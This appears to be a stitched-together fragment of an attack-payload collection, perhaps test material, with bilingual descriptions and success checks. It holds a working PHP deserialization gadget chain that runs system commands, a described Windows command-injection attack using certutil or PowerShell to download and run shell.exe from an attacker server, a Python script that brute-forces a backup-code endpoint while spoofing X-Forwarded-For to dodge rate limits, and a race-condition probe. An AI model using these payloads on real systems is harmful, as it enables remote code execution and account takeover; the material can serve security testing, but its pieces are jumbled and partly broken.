patches.expectedCommand:
<?php
class Chain {
    public $obj;
    function __destruct() {
        $this->obj->action();
    }
}
class Action {
    public $cmd;
    function action() {
        system($this->cmd);
    }
}
$payload = new Chain();
$payload->obj = new Action();
$payload->obj->cmd = "whoami";
echo serialize($payload);
?>

description.zh: 构造 Chain.__destruct 调用 Action.action 再触发 system 的两级 POP 链并输出其序列化串。命中判据：反序列化点还原对象链后返回 whoami 的当前用户名。
description.en: Builds a two-level POP chain where Chain.__destruct calls Action.action which triggers system, and prints its serialized form. Success check: after the deserialization sink restores the object chain, whoami returns the current username.

description.en: Run whoami, dir, type win.ini, and certutil/powershell download-exec at a Windows injection point. Success check: the response contains the current username, a directory listing, or win.ini content, and the attacker HTTP log records the shell.exe/shell.ps1 fetch.

import concurrent.futures, itertools, requests
TARGET="http://127.0.0.1:8080/test/verify-backup-code"
uas=itertools.cycle(["Mozilla/5.0","curl/8.0","python-requests"])
def hit(i):
    return requests.post(TARGET, json={"code":"PAYLOADER_BACKUP_CODE"}, headers={"User-Agent":next(uas),"X-Forwarded-For":f"10.0.{i//250}.{i%250}"}).status_code
with concurrent.futures.ThreadPoolExecutor(50) as ex:
    codes=list(ex.map(hit, range(200)))
print(codes.count(200))
PY
for suffix in "/" ".json" "/v2"; do curl -sS --max-time 5 -o /dev/null -w "%{http_code} $suffix\n" -d "code=PAYLOADER_BACKUP_CODE" "http://127.0.0.1:8080/test/verify-backup-code${suffix}"; done

python3 - <<'PY' 
 import concurrent.futures 
 import requests 
 TARGET = "http://127.0.0.1:8080/test/verify-backup-code" 
 def consume(_): 
     return requests.post(TARGET, json={"backup_code": "PAYLOADER_TEST_BACKUP", "session": "PAYLOADER_TEST_SESSION"}, timeout=5).status_code 
 with concurrent.futures.ThreadPoolExecutor(max_workers=2) as pool: 
     results = list(pool.map(consume, range(2))) 
 print(results) 
 PY 
 # Expected: exactly one request consumes the synthetic code; the other fails atomically.
